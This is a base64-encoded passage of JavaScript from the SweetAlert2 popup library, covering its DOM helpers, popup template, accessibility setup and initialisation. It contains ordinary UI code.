KHRhcmdldCwgY2xhc3NMaXN0KSA9PiB7XG4gICAgdG9nZ2xlQ2xhc3ModGFyZ2V0LCBjbGFzc0xpc3QsIHRydWUpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50IHwgSFRNTEVsZW1lbnRbXSB8IG51bGx9IHRhcmdldFxuICAgKiBAcGFyYW0ge3N0cmluZyB8IHN0cmluZ1tdIHwgcmVhZG9ubHkgc3RyaW5nW119IGNsYXNzTGlzdFxuICAgKi9cbiAgY29uc3QgcmVtb3ZlQ2xhc3MgPSAodGFyZ2V0LCBjbGFzc0xpc3QpID0+IHtcbiAgICB0b2dnbGVDbGFzcyh0YXJnZXQsIGNsYXNzTGlzdCwgZmFsc2UpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBHZXQgZGlyZWN0IGNoaWxkIG9mIGFuIGVsZW1lbnQgYnkgY2xhc3MgbmFtZVxuICAgKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBlbGVtXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBjbGFzc05hbWVcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgdW5kZWZpbmVkfVxuICAgKi9cbiAgY29uc3QgZ2V0RGlyZWN0Q2hpbGRCeUNsYXNzID0gKGVsZW0sIGNsYXNzTmFtZSkgPT4ge1xuICAgIGNvbnN0IGNoaWxkcmVuID0gQXJyYXkuZnJvbShlbGVtLmNoaWxkcmVuKTtcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IGNoaWxkcmVuLmxlbmd0aDsgaSsrKSB7XG4gICAgICBjb25zdCBjaGlsZCA9IGNoaWxkcmVuW2ldO1xuICAgICAgaWYgKGNoaWxkIGluc3RhbmNlb2YgSFRNTEVsZW1lbnQgJiYgaGFzQ2xhc3MoY2hpbGQsIGNsYXNzTmFtZSkpIHtcbiAgICAgICAgcmV0dXJuIGNoaWxkO1xuICAgICAgfVxuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxlbVxuICAgKiBAcGFyYW0ge3N0cmluZ30gcHJvcGVydHlcbiAgICogQHBhcmFtIHsqfSB2YWx1ZVxuICAgKi9cbiAgY29uc3QgYXBwbHlOdW1lcmljYWxTdHlsZSA9IChlbGVtLCBwcm9wZXJ0eSwgdmFsdWUpID0+IHtcbiAgICBpZiAodmFsdWUgPT09IGAke3BhcnNlSW50KHZhbHVlKX1gKSB7XG4gICAgICB2YWx1ZSA9IHBhcnNlSW50KHZhbHVlKTtcbiAgICB9XG4gICAgaWYgKHZhbHVlIHx8IHBhcnNlSW50KHZhbHVlKSA9PT0gMCkge1xuICAgICAgZWxlbS5zdHlsZVtwcm9wZXJ0eV0gPSB0eXBlb2YgdmFsdWUgPT09ICdudW1iZXInID8gYCR7dmFsdWV9cHhgIDogdmFsdWU7XG4gICAgfSBlbHNlIHtcbiAgICAgIGVsZW0uc3R5bGUucmVtb3ZlUHJvcGVydHkocHJvcGVydHkpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxlbVxuICAgKiBAcGFyYW0ge3N0cmluZ30gZGlzcGxheVxuICAgKi9cbiAgY29uc3Qgc2hvdyA9IGZ1bmN0aW9uIChlbGVtKSB7XG4gICAgbGV0IGRpc3BsYXkgPSBhcmd1bWVudHMubGVuZ3RoID4gMSAmJiBhcmd1bWVudHNbMV0gIT09IHVuZGVmaW5lZCA/IGFyZ3VtZW50c1sxXSA6ICdmbGV4JztcbiAgICBlbGVtLnN0eWxlLmRpc3BsYXkgPSBkaXNwbGF5O1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBlbGVtXG4gICAqL1xuICBjb25zdCBoaWRlID0gZWxlbSA9PiB7XG4gICAgZWxlbS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBwYXJlbnRcbiAgICogQHBhcmFtIHtzdHJpbmd9IHNlbGVjdG9yXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBwcm9wZXJ0eVxuICAgKiBAcGFyYW0ge3N0cmluZ30gdmFsdWVcbiAgICovXG4gIGNvbnN0IHNldFN0eWxlID0gKHBhcmVudCwgc2VsZWN0b3IsIHByb3BlcnR5LCB2YWx1ZSkgPT4ge1xuICAgIC8qKiBAdHlwZSB7SFRNTEVsZW1lbnR9ICovXG4gICAgY29uc3QgZWwgPSBwYXJlbnQucXVlcnlTZWxlY3RvcihzZWxlY3Rvcik7XG4gICAgaWYgKGVsKSB7XG4gICAgICBlbC5zdHlsZVtwcm9wZXJ0eV0gPSB2YWx1ZTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGVsZW1cbiAgICogQHBhcmFtIHthbnl9IGNvbmRpdGlvblxuICAgKiBAcGFyYW0ge3N0cmluZ30gZGlzcGxheVxuICAgKi9cbiAgY29uc3QgdG9nZ2xlID0gZnVuY3Rpb24gKGVsZW0sIGNvbmRpdGlvbikge1xuICAgIGxldCBkaXNwbGF5ID0gYXJndW1lbnRzLmxlbmd0aCA+IDIgJiYgYXJndW1lbnRzWzJdICE9PSB1bmRlZmluZWQgPyBhcmd1bWVudHNbMl0gOiAnZmxleCc7XG4gICAgY29uZGl0aW9uID8gc2hvdyhlbGVtLCBkaXNwbGF5KSA6IGhpZGUoZWxlbSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIGJvcnJvd2VkIGZyb20ganF1ZXJ5ICQoZWxlbSkuaXMoJzp2aXNpYmxlJykgaW1wbGVtZW50YXRpb25cbiAgICpcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxlbVxuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IGlzVmlzaWJsZSQxID0gZWxlbSA9PiAhIShlbGVtICYmIChlbGVtLm9mZnNldFdpZHRoIHx8IGVsZW0ub2Zmc2V0SGVpZ2h0IHx8IGVsZW0uZ2V0Q2xpZW50UmVjdHMoKS5sZW5ndGgpKTtcblxuICAvKipcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBhbGxCdXR0b25zQXJlSGlkZGVuID0gKCkgPT4gIWlzVmlzaWJsZSQxKGdldENvbmZpcm1CdXR0b24oKSkgJiYgIWlzVmlzaWJsZSQxKGdldERlbnlCdXR0b24oKSkgJiYgIWlzVmlzaWJsZSQxKGdldENhbmNlbEJ1dHRvbigpKTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxlbVxuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IGlzU2Nyb2xsYWJsZSA9IGVsZW0gPT4gISEoZWxlbS5zY3JvbGxIZWlnaHQgPiBlbGVtLmNsaWVudEhlaWdodCk7XG5cbiAgLyoqXG4gICAqIGJvcnJvd2VkIGZyb20gaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9hLzQ2MzUyMTE5XG4gICAqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGVsZW1cbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBoYXNDc3NBbmltYXRpb24gPSBlbGVtID0+IHtcbiAgICBjb25zdCBzdHlsZSA9IHdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGVsZW0pO1xuICAgIGNvbnN0IGFuaW1EdXJhdGlvbiA9IHBhcnNlRmxvYXQoc3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSgnYW5pbWF0aW9uLWR1cmF0aW9uJykgfHwgJzAnKTtcbiAgICBjb25zdCB0cmFuc0R1cmF0aW9uID0gcGFyc2VGbG9hdChzdHlsZS5nZXRQcm9wZXJ0eVZhbHVlKCd0cmFuc2l0aW9uLWR1cmF0aW9uJykgfHwgJzAnKTtcbiAgICByZXR1cm4gYW5pbUR1cmF0aW9uID4gMCB8fCB0cmFuc0R1cmF0aW9uID4gMDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtudW1iZXJ9IHRpbWVyXG4gICAqIEBwYXJhbSB7Ym9vbGVhbn0gcmVzZXRcbiAgICovXG4gIGNvbnN0IGFuaW1hdGVUaW1lclByb2dyZXNzQmFyID0gZnVuY3Rpb24gKHRpbWVyKSB7XG4gICAgbGV0IHJlc2V0ID0gYXJndW1lbnRzLmxlbmd0aCA+IDEgJiYgYXJndW1lbnRzWzFdICE9PSB1bmRlZmluZWQgPyBhcmd1bWVudHNbMV0gOiBmYWxzZTtcbiAgICBjb25zdCB0aW1lclByb2dyZXNzQmFyID0gZ2V0VGltZXJQcm9ncmVzc0JhcigpO1xuICAgIGlmIChpc1Zpc2libGUkMSh0aW1lclByb2dyZXNzQmFyKSkge1xuICAgICAgaWYgKHJlc2V0KSB7XG4gICAgICAgIHRpbWVyUHJvZ3Jlc3NCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICdub25lJztcbiAgICAgICAgdGltZXJQcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcxMDAlJztcbiAgICAgIH1cbiAgICAgIHNldFRpbWVvdXQoKCkgPT4ge1xuICAgICAgICB0aW1lclByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSBgd2lkdGggJHt0aW1lciAvIDEwMDB9cyBsaW5lYXJgO1xuICAgICAgICB0aW1lclByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJztcbiAgICAgIH0sIDEwKTtcbiAgICB9XG4gIH07XG4gIGNvbnN0IHN0b3BUaW1lclByb2dyZXNzQmFyID0gKCkgPT4ge1xuICAgIGNvbnN0IHRpbWVyUHJvZ3Jlc3NCYXIgPSBnZXRUaW1lclByb2dyZXNzQmFyKCk7XG4gICAgY29uc3QgdGltZXJQcm9ncmVzc0JhcldpZHRoID0gcGFyc2VJbnQod2luZG93LmdldENvbXB1dGVkU3R5bGUodGltZXJQcm9ncmVzc0Jhcikud2lkdGgpO1xuICAgIHRpbWVyUHJvZ3Jlc3NCYXIuc3R5bGUucmVtb3ZlUHJvcGVydHkoJ3RyYW5zaXRpb24nKTtcbiAgICB0aW1lclByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzEwMCUnO1xuICAgIGNvbnN0IHRpbWVyUHJvZ3Jlc3NCYXJGdWxsV2lkdGggPSBwYXJzZUludCh3aW5kb3cuZ2V0Q29tcHV0ZWRTdHlsZSh0aW1lclByb2dyZXNzQmFyKS53aWR0aCk7XG4gICAgY29uc3QgdGltZXJQcm9ncmVzc0JhclBlcmNlbnQgPSB0aW1lclByb2dyZXNzQmFyV2lkdGggLyB0aW1lclByb2dyZXNzQmFyRnVsbFdpZHRoICogMTAwO1xuICAgIHRpbWVyUHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBgJHt0aW1lclByb2dyZXNzQmFyUGVyY2VudH0lYDtcbiAgfTtcblxuICBjb25zdCBSRVNUT1JFX0ZPQ1VTX1RJTUVPVVQgPSAxMDA7XG5cbiAgLyoqIEB0eXBlIHtHbG9iYWxTdGF0ZX0gKi9cbiAgY29uc3QgZ2xvYmFsU3RhdGUgPSB7fTtcbiAgY29uc3QgZm9jdXNQcmV2aW91c0FjdGl2ZUVsZW1lbnQgPSAoKSA9PiB7XG4gICAgaWYgKGdsb2JhbFN0YXRlLnByZXZpb3VzQWN0aXZlRWxlbWVudCBpbnN0YW5jZW9mIEhUTUxFbGVtZW50KSB7XG4gICAgICBnbG9iYWxTdGF0ZS5wcmV2aW91c0FjdGl2ZUVsZW1lbnQuZm9jdXMoKTtcbiAgICAgIGdsb2JhbFN0YXRlLnByZXZpb3VzQWN0aXZlRWxlbWVudCA9IG51bGw7XG4gICAgfSBlbHNlIGlmIChkb2N1bWVudC5ib2R5KSB7XG4gICAgICBkb2N1bWVudC5ib2R5LmZvY3VzKCk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBSZXN0b3JlIHByZXZpb3VzIGFjdGl2ZSAoZm9jdXNlZCkgZWxlbWVudFxuICAgKlxuICAgKiBAcGFyYW0ge2Jvb2xlYW59IHJldHVybkZvY3VzXG4gICAqIEByZXR1cm5zIHtQcm9taXNlfVxuICAgKi9cbiAgY29uc3QgcmVzdG9yZUFjdGl2ZUVsZW1lbnQgPSByZXR1cm5Gb2N1cyA9PiB7XG4gICAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4ge1xuICAgICAgaWYgKCFyZXR1cm5Gb2N1cykge1xuICAgICAgICByZXR1cm4gcmVzb2x2ZSgpO1xuICAgICAgfVxuICAgICAgY29uc3QgeCA9IHdpbmRvdy5zY3JvbGxYO1xuICAgICAgY29uc3QgeSA9IHdpbmRvdy5zY3JvbGxZO1xuICAgICAgZ2xvYmFsU3RhdGUucmVzdG9yZUZvY3VzVGltZW91dCA9IHNldFRpbWVvdXQoKCkgPT4ge1xuICAgICAgICBmb2N1c1ByZXZpb3VzQWN0aXZlRWxlbWVudCgpO1xuICAgICAgICByZXNvbHZlKCk7XG4gICAgICB9LCBSRVNUT1JFX0ZPQ1VTX1RJTUVPVVQpOyAvLyBpc3N1ZXMvOTAwXG5cbiAgICAgIHdpbmRvdy5zY3JvbGxUbyh4LCB5KTtcbiAgICB9KTtcbiAgfTtcblxuICAvKipcbiAgICogRGV0ZWN0IE5vZGUgZW52XG4gICAqXG4gICAqIEByZXR1cm5zIHtib29sZWFufVxuICAgKi9cbiAgY29uc3QgaXNOb2RlRW52ID0gKCkgPT4gdHlwZW9mIHdpbmRvdyA9PT0gJ3VuZGVmaW5lZCcgfHwgdHlwZW9mIGRvY3VtZW50ID09PSAndW5kZWZpbmVkJztcblxuICBjb25zdCBzd2VldEhUTUwgPSBgXG4gPGRpdiBhcmlhLWxhYmVsbGVkYnk9XCIke3N3YWxDbGFzc2VzLnRpdGxlfVwiIGFyaWEtZGVzY3JpYmVkYnk9XCIke3N3YWxDbGFzc2VzWydodG1sLWNvbnRhaW5lciddfVwiIGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5wb3B1cH1cIiB0YWJpbmRleD1cIi0xXCI+XG4gICA8YnV0dG9uIHR5cGU9XCJidXR0b25cIiBjbGFzcz1cIiR7c3dhbENsYXNzZXMuY2xvc2V9XCI+PC9idXR0b24+XG4gICA8dWwgY2xhc3M9XCIke3N3YWxDbGFzc2VzWydwcm9ncmVzcy1zdGVwcyddfVwiPjwvdWw+XG4gICA8ZGl2IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5pY29ufVwiPjwvZGl2PlxuICAgPGltZyBjbGFzcz1cIiR7c3dhbENsYXNzZXMuaW1hZ2V9XCIgLz5cbiAgIDxoMiBjbGFzcz1cIiR7c3dhbENsYXNzZXMudGl0bGV9XCIgaWQ9XCIke3N3YWxDbGFzc2VzLnRpdGxlfVwiPjwvaDI+XG4gICA8ZGl2IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlc1snaHRtbC1jb250YWluZXInXX1cIiBpZD1cIiR7c3dhbENsYXNzZXNbJ2h0bWwtY29udGFpbmVyJ119XCI+PC9kaXY+XG4gICA8aW5wdXQgY2xhc3M9XCIke3N3YWxDbGFzc2VzLmlucHV0fVwiIC8+XG4gICA8aW5wdXQgdHlwZT1cImZpbGVcIiBjbGFzcz1cIiR7c3dhbENsYXNzZXMuZmlsZX1cIiAvPlxuICAgPGRpdiBjbGFzcz1cIiR7c3dhbENsYXNzZXMucmFuZ2V9XCI+XG4gICAgIDxpbnB1dCB0eXBlPVwicmFuZ2VcIiAvPlxuICAgICA8b3V0cHV0Pjwvb3V0cHV0PlxuICAgPC9kaXY+XG4gICA8c2VsZWN0IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5zZWxlY3R9XCI+PC9zZWxlY3Q+XG4gICA8ZGl2IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5yYWRpb31cIj48L2Rpdj5cbiAgIDxsYWJlbCBmb3I9XCIke3N3YWxDbGFzc2VzLmNoZWNrYm94fVwiIGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5jaGVja2JveH1cIj5cbiAgICAgPGlucHV0IHR5cGU9XCJjaGVja2JveFwiIC8+XG4gICAgIDxzcGFuIGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5sYWJlbH1cIj48L3NwYW4+XG4gICA8L2xhYmVsPlxuICAgPHRleHRhcmVhIGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy50ZXh0YXJlYX1cIj48L3RleHRhcmVhPlxuICAgPGRpdiBjbGFzcz1cIiR7c3dhbENsYXNzZXNbJ3ZhbGlkYXRpb24tbWVzc2FnZSddfVwiIGlkPVwiJHtzd2FsQ2xhc3Nlc1sndmFsaWRhdGlvbi1tZXNzYWdlJ119XCI+PC9kaXY+XG4gICA8ZGl2IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5hY3Rpb25zfVwiPlxuICAgICA8ZGl2IGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5sb2FkZXJ9XCI+PC9kaXY+XG4gICAgIDxidXR0b24gdHlwZT1cImJ1dHRvblwiIGNsYXNzPVwiJHtzd2FsQ2xhc3Nlcy5jb25maXJtfVwiPjwvYnV0dG9uPlxuICAgICA8YnV0dG9uIHR5cGU9XCJidXR0b25cIiBjbGFzcz1cIiR7c3dhbENsYXNzZXMuZGVueX1cIj48L2J1dHRvbj5cbiAgICAgPGJ1dHRvbiB0eXBlPVwiYnV0dG9uXCIgY2xhc3M9XCIke3N3YWxDbGFzc2VzLmNhbmNlbH1cIj48L2J1dHRvbj5cbiAgIDwvZGl2PlxuICAgPGRpdiBjbGFzcz1cIiR7c3dhbENsYXNzZXMuZm9vdGVyfVwiPjwvZGl2PlxuICAgPGRpdiBjbGFzcz1cIiR7c3dhbENsYXNzZXNbJ3RpbWVyLXByb2dyZXNzLWJhci1jb250YWluZXInXX1cIj5cbiAgICAgPGRpdiBjbGFzcz1cIiR7c3dhbENsYXNzZXNbJ3RpbWVyLXByb2dyZXNzLWJhciddfVwiPjwvZGl2PlxuICAgPC9kaXY+XG4gPC9kaXY+XG5gLnJlcGxhY2UoLyhefFxcbilcXHMqL2csICcnKTtcblxuICAvKipcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCByZXNldE9sZENvbnRhaW5lciA9ICgpID0+IHtcbiAgICBjb25zdCBvbGRDb250YWluZXIgPSBnZXRDb250YWluZXIoKTtcbiAgICBpZiAoIW9sZENvbnRhaW5lcikge1xuICAgICAgcmV0dXJuIGZhbHNlO1xuICAgIH1cbiAgICBvbGRDb250YWluZXIucmVtb3ZlKCk7XG4gICAgcmVtb3ZlQ2xhc3MoW2RvY3VtZW50LmRvY3VtZW50RWxlbWVudCwgZG9jdW1lbnQuYm9keV0sIFtzd2FsQ2xhc3Nlc1snbm8tYmFja2Ryb3AnXSwgc3dhbENsYXNzZXNbJ3RvYXN0LXNob3duJ10sIHN3YWxDbGFzc2VzWydoYXMtY29sdW1uJ11dKTtcbiAgICByZXR1cm4gdHJ1ZTtcbiAgfTtcbiAgY29uc3QgcmVzZXRWYWxpZGF0aW9uTWVzc2FnZSQxID0gKCkgPT4ge1xuICAgIGdsb2JhbFN0YXRlLmN1cnJlbnRJbnN0YW5jZS5yZXNldFZhbGlkYXRpb25NZXNzYWdlKCk7XG4gIH07XG4gIGNvbnN0IGFkZElucHV0Q2hhbmdlTGlzdGVuZXJzID0gKCkgPT4ge1xuICAgIGNvbnN0IHBvcHVwID0gZ2V0UG9wdXAoKTtcbiAgICBjb25zdCBpbnB1dCA9IGdldERpcmVjdENoaWxkQnlDbGFzcyhwb3B1cCwgc3dhbENsYXNzZXMuaW5wdXQpO1xuICAgIGNvbnN0IGZpbGUgPSBnZXREaXJlY3RDaGlsZEJ5Q2xhc3MocG9wdXAsIHN3YWxDbGFzc2VzLmZpbGUpO1xuICAgIC8qKiBAdHlwZSB7SFRNTElucHV0RWxlbWVudH0gKi9cbiAgICBjb25zdCByYW5nZSA9IHBvcHVwLnF1ZXJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLnJhbmdlfSBpbnB1dGApO1xuICAgIC8qKiBAdHlwZSB7SFRNTE91dHB1dEVsZW1lbnR9ICovXG4gICAgY29uc3QgcmFuZ2VPdXRwdXQgPSBwb3B1cC5xdWVyeVNlbGVjdG9yKGAuJHtzd2FsQ2xhc3Nlcy5yYW5nZX0gb3V0cHV0YCk7XG4gICAgY29uc3Qgc2VsZWN0ID0gZ2V0RGlyZWN0Q2hpbGRCeUNsYXNzKHBvcHVwLCBzd2FsQ2xhc3Nlcy5zZWxlY3QpO1xuICAgIC8qKiBAdHlwZSB7SFRNTElucHV0RWxlbWVudH0gKi9cbiAgICBjb25zdCBjaGVja2JveCA9IHBvcHVwLnF1ZXJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLmNoZWNrYm94fSBpbnB1dGApO1xuICAgIGNvbnN0IHRleHRhcmVhID0gZ2V0RGlyZWN0Q2hpbGRCeUNsYXNzKHBvcHVwLCBzd2FsQ2xhc3Nlcy50ZXh0YXJlYSk7XG4gICAgaW5wdXQub25pbnB1dCA9IHJlc2V0VmFsaWRhdGlvbk1lc3NhZ2UkMTtcbiAgICBmaWxlLm9uY2hhbmdlID0gcmVzZXRWYWxpZGF0aW9uTWVzc2FnZSQxO1xuICAgIHNlbGVjdC5vbmNoYW5nZSA9IHJlc2V0VmFsaWRhdGlvbk1lc3NhZ2UkMTtcbiAgICBjaGVja2JveC5vbmNoYW5nZSA9IHJlc2V0VmFsaWRhdGlvbk1lc3NhZ2UkMTtcbiAgICB0ZXh0YXJlYS5vbmlucHV0ID0gcmVzZXRWYWxpZGF0aW9uTWVzc2FnZSQxO1xuICAgIHJhbmdlLm9uaW5wdXQgPSAoKSA9PiB7XG4gICAgICByZXNldFZhbGlkYXRpb25NZXNzYWdlJDEoKTtcbiAgICAgIHJhbmdlT3V0cHV0LnZhbHVlID0gcmFuZ2UudmFsdWU7XG4gICAgfTtcbiAgICByYW5nZS5vbmNoYW5nZSA9ICgpID0+IHtcbiAgICAgIHJlc2V0VmFsaWRhdGlvbk1lc3NhZ2UkMSgpO1xuICAgICAgcmFuZ2VPdXRwdXQudmFsdWUgPSByYW5nZS52YWx1ZTtcbiAgICB9O1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge3N0cmluZyB8IEhUTUxFbGVtZW50fSB0YXJnZXRcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50fVxuICAgKi9cbiAgY29uc3QgZ2V0VGFyZ2V0ID0gdGFyZ2V0ID0+IHR5cGVvZiB0YXJnZXQgPT09ICdzdHJpbmcnID8gZG9jdW1lbnQucXVlcnlTZWxlY3Rvcih0YXJnZXQpIDogdGFyZ2V0O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGNvbnN0IHNldHVwQWNjZXNzaWJpbGl0eSA9IHBhcmFtcyA9PiB7XG4gICAgY29uc3QgcG9wdXAgPSBnZXRQb3B1cCgpO1xuICAgIHBvcHVwLnNldEF0dHJpYnV0ZSgncm9sZScsIHBhcmFtcy50b2FzdCA/ICdhbGVydCcgOiAnZGlhbG9nJyk7XG4gICAgcG9wdXAuc2V0QXR0cmlidXRlKCdhcmlhLWxpdmUnLCBwYXJhbXMudG9hc3QgPyAncG9saXRlJyA6ICdhc3NlcnRpdmUnKTtcbiAgICBpZiAoIXBhcmFtcy50b2FzdCkge1xuICAgICAgcG9wdXAuc2V0QXR0cmlidXRlKCdhcmlhLW1vZGFsJywgJ3RydWUnKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IHRhcmdldEVsZW1lbnRcbiAgICovXG4gIGNvbnN0IHNldHVwUlRMID0gdGFyZ2V0RWxlbWVudCA9PiB7XG4gICAgaWYgKHdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKHRhcmdldEVsZW1lbnQpLmRpcmVjdGlvbiA9PT0gJ3J0bCcpIHtcbiAgICAgIGFkZENsYXNzKGdldENvbnRhaW5lcigpLCBzd2FsQ2xhc3Nlcy5ydGwpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQWRkIG1vZGFsICsgYmFja2Ryb3AgKyBuby13YXIgbWVzc2FnZSBmb3IgUnVzc2lhbnMgdG8gRE9NXG4gICAqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgaW5pdCA9IHBhcmFtcyA9PiB7XG4gICAgLy8gQ2xlYW4gdXAgdGhlIG9sZCBwb3B1cCBjb250YWluZXIgaWYgaXQgZXhpc3RzXG4gICAgY29uc3Qgb2xkQ29udGFpbmVyRXhpc3RlZCA9IHJlc2V0T2xkQ29udGFpbmVyKCk7XG5cbiAgICAvKiBpc3RhbmJ1bCBpZ25vcmUgaWYgKi9cbiAgICBpZiAoaXNOb2RlRW52KCkpIHtcbiAgICAgIGVycm9yKCdTd2VldEFsZXJ0MiByZXF1aXJlcyBkb2N1bWVudCB0byBpbml0aWFsaXplJyk7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpO1xuICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSBzd2FsQ2xhc3Nlcy5jb250YWluZXI7XG4gICAgaWYgKG9sZENvbnRhaW5lckV4aXN0ZWQpIHtcbiAgICAgIGFkZENsYXNzKGNvbnRhaW5lciwgc3dhbENsYXNzZXNbJ25vLXRyYW5zaXRpb24nXSk7XG4gICAgfVxuICAgIHNldElubmVySHRtbChjb250YWluZXIsIHN3ZWV0SFRNTCk7XG4gICAgY29uc3QgdGFyZ2V0RWxlbWVudCA9IGdldFRhcmdldChwYXJhbXMudGFyZ2V0KTtcbiAgICB0YXJnZXRFbGVtZW50LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7XG4gICAgc2V0dXBBY2Nlc3NpYmlsaXR5KHBhcmFtcyk7XG4gICAgc2V0dXBSVEwodGFyZ2V0RWxlbWVudCk7XG4gICAgYWRkSW5wdXRDaGFuZ2VMaXN0ZW5lcnMoKTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudCB8IG9iamVjdCB8IHN0cmluZ30gcGFyYW1cbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gdGFyZ2V0XG4gICAqL1xuICBjb25zdCBwYXJzZUh0bWxUb0NvbnRhaW5lciA9IChwYXJhbSwgdGFyZ2V0KSA9PiB7XG4gICAgLy8gRE9NIGVsZW1lbnRcbiAgICBpZiAocGFyYW0gaW5zdGFuY2VvZiBIVE1MRWxlbWVudCkge1xuICAgICAgdGFyZ2V0LmFwcGVuZENoaWxkKHBhcmFtKTtcbiAgICB9XG5cbiAgICAvLyBPYmplY3RcbiAgICBlbHNlIGlmICh0eXBlb2YgcGFyYW0gPT09ICdvYmplY3QnKSB7XG4gICAgICBoYW5kbGVPYmplY3QocGFyYW0sIHRhcmdldCk7XG4gICAgfVxuXG4gICAgLy8gUGxhaW4gc3RyaW5nXG4gICAgZWxzZSBpZiAocGFyYW0pIHtcbiAgICAgIHNldElubmVySHRtbCh0YXJnZXQsIHBhcmFtKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7b2JqZWN0fSBwYXJhbVxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSB0YXJnZXRcbiAgICovXG4gIGNvbnN0IGhhbmRsZU9iamVjdCA9IChwYXJhbSwgdGFyZ2V0KSA9PiB7XG4gICAgLy8gSlF1ZXJ5IGVsZW1lbnQocylcbiAgICBpZiAocGFyYW0uanF1ZXJ5KSB7XG4gICAgICBoYW5kbGVKcXVlcnlFbGVtKHRhcmdldCwgcGFyYW0pO1xuICAgIH1cblxuICAgIC8vIEZvciBvdGhlciBvYmplY3RzIHVzZSB0aGVpciBzdHJpbmcgcmVwcmVzZW50YXRpb25cbiAgICBlbHNlIHtcbiAgICAgIHNldElubmVySHRtbCh0YXJnZXQsIHBhcmFtLnRvU3RyaW5nKCkpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gdGFyZ2V0XG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGVsZW1cbiAgICovXG4gIGNvbnN0IGhhbmRsZUpxdWVyeUVsZW0gPSAodGFyZ2V0LCBlbGVtKSA9PiB7XG4gICAgdGFyZ2V0LnRleHRDb250ZW50ID0gJyc7XG4gICAgaWYgKDAgaW4gZWxlbSkge1xuICAgICAgZm9yIChsZXQgaSA9IDA7IChpIGluIGVsZW0pOyBpKyspIHtcbiAgICAgICAgdGFyZ2V0LmFwcGVuZENoaWxkKGVsZW1baV0uY2xvbmVOb2RlKHRydWUpKTtcbiAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgdGFyZ2V0LmFwcGVuZENoaWxkKGVsZW0uY2xvbmVOb2RlKHRydWUpKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEByZXR1cm5zIHsnd2Via2l0QW5pbWF0aW9uRW5kJyB8ICdhbml